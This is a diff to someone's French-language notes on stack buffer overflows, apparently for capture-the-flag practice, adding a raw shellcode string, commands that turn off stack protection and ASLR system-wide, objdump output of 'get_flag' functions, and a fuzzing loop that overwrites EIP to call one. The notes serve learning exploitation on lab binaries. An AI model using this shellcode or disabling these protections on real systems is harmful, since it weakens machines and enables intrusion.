@@ -3,6 +3,10 @@
 ## Tools
 
 Plugin pour gdb : https://github.com/longld/peda
+string xxx
+test eax, eax : caracteristique des comparaisons de strings
+objdump -D buffer_01
+
 
 ## Payloads
 
@@ -10,6 +14,18 @@ Plugin pour gdb : https://github.com/longld/peda
 ````
 "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
 ````
+
+## Security
+
+gcc -fno-stack-protector -z execstack 
+Disable ASLR for one binary : setarch `uname -m` -R /root/mybinary
+Disable ASLR for the session : echo 0 > /proc/sys/kernel/randomize_va_space
+0: off
+1: on
+2: on (default value)
+Disable ASLR:
+sysctl -w kernel.randomize_va_space=0 in /etc/sysctl.conf
+
 
 </br>
 
@@ -31,6 +47,34 @@ int main(int argc, char *argv[])
 }
 $ gcc -fno-stack-protector buffer_01.c -o buffer_01
 $ buffer_01 ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
+````
+
+</br>
+
+## Internal function call
+
+On regarde les fonctions et leurs adresses
+````
+$ objdump -D ./strcpy
+08048533 <get_flag_1>:
+ 8048533:	55                   	push   %ebp
+ 8048534:	89 e5                	mov    %esp,%ebp
+ 8048536:	83 ec 08             	sub    $0x8,%esp
+ 8048539:	83 ec 0c             	sub    $0xc,%esp
+ 804853c:	68 20 86 04 08       	push   $0x8048620
+ 8048541:	e8 1a fe ff ff       	call   8048360 <system@plt>
+ 8048546:	83 c4 10             	add    $0x10,%esp
+ 8048549:	c9                   	leave
+ 804854a:	c3                   	ret
+
+0804854b <get_flag_2>:
+ 804854b:	55                   	push   %ebp
+ 804854c:	89 e5                	mov    %esp,%ebp
+ 804854e:	83 ec 08             	sub    $0x8,%e
+````
+get_flag_2 est en 0804854b, on va pousser 0804854b en bout de notre fuzzer, et le faire glisser jusqu'à ce qu'il tombe sur EIP et appelle la fonction get_flag_2
+````
+$ for i in `seq 1 100`;do echo $i; ./strcpy $(python -c "print 'a'*$i+'\x4b\x85\x04\x08';"); done
 ````
 
 </br>
